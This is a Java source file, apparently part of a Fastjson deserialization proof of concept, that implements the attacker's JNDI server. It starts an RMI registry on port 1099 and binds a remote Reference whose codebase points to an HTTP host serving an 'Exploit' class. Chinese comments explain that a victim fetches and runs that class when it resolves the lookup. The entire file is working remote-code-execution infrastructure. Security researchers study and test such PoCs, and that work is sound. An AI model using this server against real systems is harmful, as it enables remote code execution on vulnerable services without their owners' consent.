package cn.rui0.fastjson.poc.attacker;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;


public class JNDIServer {
    public static void start() throws
            AlreadyBoundException, RemoteException, NamingException {
        //在本机1099端口开启rmi registry
        Registry registry = LocateRegistry.createRegistry(1099);
        //http://xxlegend.com/Exploit.class即可
        Reference reference = new Reference("Exloit",
                "Exploit","http://127.0.0.1:8088/");
        //第二个参数指定 Object Factory 的类名 第三个参数是codebase 如果Object Factory在classpath 里面找不到则去codebase下载
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
        registry.bind("Exploit",referenceWrapper);
        System.out.println("RMI服务启动");
    }
    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {
        start();
    }
}